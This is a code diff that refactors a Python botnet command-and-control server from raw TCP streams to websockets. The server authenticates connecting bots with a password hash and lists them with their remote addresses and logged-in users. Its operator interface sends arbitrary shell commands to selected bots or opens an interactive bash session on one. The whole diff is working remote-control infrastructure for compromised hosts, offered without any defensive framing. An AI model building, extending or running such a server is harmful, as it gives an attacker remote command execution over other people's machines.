@@ -1,183 +1,145 @@
-import asyncio
-import re
-from asyncio.streams import StreamReader, StreamWriter
-from typing import List
+from typing import List, Union
 
 import click
-import names
-from aioconsole import ainput
 from prettytable import PrettyTable
 
-from utils import hash_sha256, is_num
+from bot_client import Bot
+from utils import hash_sha256, is_num, Id, configure_logging
+
+import asyncio
+import websockets
+import logging
+
+from websockets.server import WebSocketServerProtocol as WebSocketConn
+from websockets.exceptions import ConnectionClosedError
 
 
-class Id:
-    idx = 1
+logger = logging.getLogger(__name__)
 
-    @staticmethod
-    def next():
-        cur = Id.idx
-        Id.idx += 1
-        return cur
-
-
-class Bot:
-    def __init__(self,
-                 idx: int,
-                 remote_address: str,
-                 reader: StreamReader,
-                 writer: StreamWriter):
-        self.idx = idx
-        self.remote_address = remote_address
-        self.reader = reader
-        self.writer = writer
-        self.name: str = names.get_full_name()
-        self.user: str = "--Unknown--"
-
-    async def set_user(self):
-        logged_as = await self.send_command("whoami")
-        self.user = logged_as.strip("\n") if logged_as else "--Unknown--"
-
-    def __str__(self):
-        return f"Bot {self.remote_address} with idx: {self.idx} {self.name} " \
-            f"with user {self.user}"
-
-    async def send_command(self, command: str):
-        # TODO check if connection is still alive
-        self.writer.write(command.encode("utf8"))
-        received = ""
-        while not received.endswith("DONE\n"):
-            received = f'{received}{(await self.reader.read(255)).decode("utf8")}'
-        received = received.strip("DONE\n")
-        return received
+CLI_OPTIONS = f'Enter: \n' \
+    f'* "0" - to print bot clients collection\n' \
+    f'* Indexes of clients separated by space to send bash command to\n' \
+    f'* Index of one client to jump into bash (send "exit" for termination)\n'
 
 
 class Context:
-    def __init__(self, plain_password):
-        self.pass_hash: str = hash_sha256(plain_password)
+    def __init__(self, plain_password: str):
+        self.pass_hash = hash_sha256(plain_password)
         self.bots: List[Bot] = []
-        self.interrupted = False
 
-    # TODO: allow connection to control center via TCP
-    # async def handle_cli_control(self, reader: StreamReader,
-    #                              writer: StreamWriter):
-    #     request = None
-    #     while request != 'quit':
-    #         request = (await reader.read(255)).decode('utf8')
-    #         response = str(eval(request)) + '\n'
-    #         writer.write(response.encode('utf8'))
-    #         await writer.drain()
-    #     writer.close()
-
-    def get_bot(self, idx):
+    def get_bot(self, idx: int) -> Union[Bot, None]:
         try:
             return list(filter(lambda x: x.idx == idx, self.bots))[0]
         except Exception:
             return None
 
-    def log(self, msg: str, pline=False):
-        if not self.interrupted:
-            self.interrupted = True
-            print()
+    async def add_bot(self, ws: WebSocketConn):
+        # First the client sends logged in user
+        user = await ws.recv()
+        try:
+            remote_adr, _ = ws.remote_address
+            new_bot = Bot(
+                Id.next(),
+                remote_adr,
+                ws,
+                user.strip("\n") if user else "--unknown--"
+            )
 
-        print(f"\nLOG: {msg}" if pline else f"LOG: {msg}")
+            self.bots.append(new_bot)
+            logger.info(f"Added {new_bot}")
+            return new_bot
 
-    def print_cli_options(self):
-        self.interrupted = False
-        print("> Enter:")
-        print('> "0" - to print bot clients collection')
-        print("> Indexes of bot clients separated by space to send bash command")
-        print("> ", end="", flush=True)
+        except Exception as e:
+            logger.error(f"Exception {e} during adding new bot client")
+            return None
 
-    async def command_control_cli(self):
-        self.print_cli_options()
+    def remove_bot_client(self, bot: Bot):
+        if bot in self.bots:
+            self.bots.remove(bot)
+            logger.info(f"{bot} removed")
+
+    def get_database_summary(self) -> str:
+        x = PrettyTable()
+        x.field_names = ["Index", "Remote address", "Logged as"]
+        for bot in self.bots:
+            x.add_row([bot.idx, bot.remote_address, bot.user])
+        return f"\n{x}"
+
+
+class CommandControl:
+    def __init__(self, ctx: Context):
+        self.ctx = ctx
+
+    async def bot_authenticated(self, ws: WebSocketConn):
+        pass_hash = await ws.recv()
+        return pass_hash == self.ctx.pass_hash
+
+    async def handle_bot(self, ws: WebSocketConn, _: str):
+        if not await self.bot_authenticated(ws):
+            logger.info(f"Bot client {ws.remote_address} not authenticated")
+            await ws.close()
+            return
+
+        bot = await self.ctx.add_bot(ws)
+        if bot:
+            await ws.keepalive_ping()
+            self.ctx.remove_bot_client(bot)
+
+    async def execute_commands(self, ws: WebSocketConn, idxs: List[int]):
+        await ws.send("Enter command:")
+        cmd = await ws.recv()
+        for idx in idxs:
+            cur_bot = self.ctx.get_bot(idx)
+            stdout = await cur_bot.send_command(cmd)
+
+            if stdout is False:
+                self.ctx.remove_bot_client(cur_bot)
+                await ws.send(f"Connection with bot {cur_bot} was closed...")
+            else:
+                stdout = f"Bot {idx}:\n{stdout}"
+                await ws.send(stdout)
+
+    async def start_bash(self, ws: WebSocketConn, bot: Bot):
         while True:
-            choice = (await ainput("")).strip("\n")
+            cmd = await ws.recv()
+            if cmd.strip("\n").lower() == "exit":
+                break
 
-            if choice == "0":
-                self.print_bot_database_summary(updated=False)
-                self.print_cli_options()
-                continue
+            stdout = await bot.send_command(cmd)
+            if ws.closed or stdout is False:
+                self.ctx.remove_bot_client(bot)
+                await ws.send(f"Connection with bot {bot.idx} was closed...")
+                break
 
-            if any(filter(lambda x: not is_num(x), choice.split(" "))):
-                print("Unknown input")
-                print("> ", end="", flush=True)
-                continue
+            await ws.send(stdout)
 
-            print("Enter command:\n> ", end="", flush=True)
-            command = await ainput("")
+    async def handle_cli(self, cli_ws: WebSocketConn, _: str):
+        logger.info("Command and control connection established")
+        try:
+            while True:
+                await cli_ws.send(CLI_OPTIONS)
+                choice = (await cli_ws.recv())
 
-            bot_idxs = choice.split(" ")
-            for idx in bot_idxs:
-                bot = self.get_bot(int(idx))
-                if not bot:
-                    print(f"Did not find bot with idx {idx}")
+                if choice == "0":
+                    await cli_ws.send(self.ctx.get_database_summary())
                     continue
 
-                print(f"Bot idx {idx}:")
-                stdout = await bot.send_command(command)
-                print(stdout)
+                # Validate the input
+                nums = choice.split(" ")
+                if any(filter(lambda x: not is_num(x), nums)):
+                    await cli_ws.send("Unknown input")
+                    continue
 
-            print("\nDONE\n")
-            self.print_cli_options()
+                # Start bash with this client
+                if len(nums) == 1 and nums[0]:
+                    bot = self.ctx.get_bot(int(nums[0]))
+                    await self.start_bash(cli_ws, bot)
+                    continue
 
-    async def handle_bot(self, reader: StreamReader, writer: StreamWriter):
-        remote_adr = writer.transport.get_extra_info('peername')[0]
-        pass_line = (await reader.readline()).decode('utf8')
-
-        if not self.bot_authenticated(pass_line):
-            self.log(f"Client from {remote_adr} has wrong password")
-            return
-
-        success, idx = await self.add_bot_client(reader, writer)
-        if not success:
-            return
-
-    def bot_authenticated(self, pass_line: str):
-        re_hash = re.search("^Password: (.*)$", pass_line)
-        return len(re_hash.groups()) and re_hash.group(1) == self.pass_hash
-
-    async def add_bot_client(self, reader: StreamReader, writer: StreamWriter):
-        idx = Id.next()
-        try:
-            remote_adr = writer.transport.get_extra_info('peername')[0]
-            new_bot = Bot(
-                idx,
-                remote_adr,
-                reader,
-                writer
-            )
-            await new_bot.set_user()
-
-            self.log(f"Adding new bot client from adr {remote_adr}...",pline=True)
-            self.bots.append(new_bot)
-            self.print_bot_database_summary()
-            return True, idx
-        except Exception as e:
-            self.log(f"Exception {e} during creating new bot client")
-            return False, 0
-        finally:
-            # Return back cli to user
-            self.print_cli_options()
-
-    def remove_bot_client(self, idx: int):
-        removing_bot = list(filter(lambda x: x.idx == idx, self.bots))[0]
-        self.log(f"{removing_bot} is being removed, conn is closed", pline=True)
-        self.bots.remove(removing_bot)
-        self.print_bot_database_summary()
-
-        # Return back cli to user
-        self.print_cli_options()
-
-    def print_bot_database_summary(self, updated=True):
-        if updated:
-            self.log("Bot clients collection got updated:")
-        x = PrettyTable()
-        x.field_names = ["Index", "Remote address", "Name", "Logged as"]
-        for bot in self.bots:
-            x.add_row([bot.idx, bot.remote_address, bot.name, bot.user])
-        print(x)
-        print()
+                # Execute commands
+                await self.execute_commands(cli_ws, [int(x) for x in nums])
+        except ConnectionClosedError:
+            logger.info("Command and control connection closed")
 
 
 @click.command()
@@ -198,7 +160,7 @@ class Context:
 @click.option(
     "--secret_password",
     "-s",
-    default="pass",
+    default="password",
     help="Password needed for bots to connect",
 )
 @click.option(
@@ -208,29 +170,20 @@ class Context:
     help="Ip address for server to listen on",
 )
 def main(cac_port: int, bot_port: int, ip_address: str, secret_password: str):
+    configure_logging()
     ctx = Context(secret_password)
-    loop = asyncio.get_event_loop()
+    cac = CommandControl(ctx)
 
-    # TODO: allow connection to control center via TCP
-    # Start tcp server loop taking care of cli control connections
-    # loop.create_task(asyncio.start_server(ctx.handle_cli_control,
-    #                                       ip_address,
-    #                                       cac_port))
+    bot_clients_server = websockets.serve(cac.handle_bot, ip_address, bot_port)
+    control_server = websockets.serve(cac.handle_cli, ip_address, cac_port)
 
-    # Start tcp server loop taking care of botnet connections
-    loop.create_task(asyncio.start_server(ctx.handle_bot,
-                                          ip_address,
-                                          bot_port))
+    logger.info(f"Starting bot client server on {ip_address}:{bot_port}")
+    asyncio.get_event_loop().run_until_complete(bot_clients_server)
 
-    # Start infinite loop to take commands from cli
-    loop.create_task(ctx.command_control_cli())
-
-    # TODO: allow connection to control center via TCP
-    # print(f"Starting control listener via {ip_address}:{cac_port}")
-    print(f"Starting bot client listener via {ip_address}:{bot_port}")
-    loop.run_forever()
+    logger.info(f"Starting control server on {ip_address}:{cac_port}")
+    asyncio.get_event_loop().run_until_complete(control_server)
+    asyncio.get_event_loop().run_forever()
 
 
 if __name__ == "__main__":
     main()
-
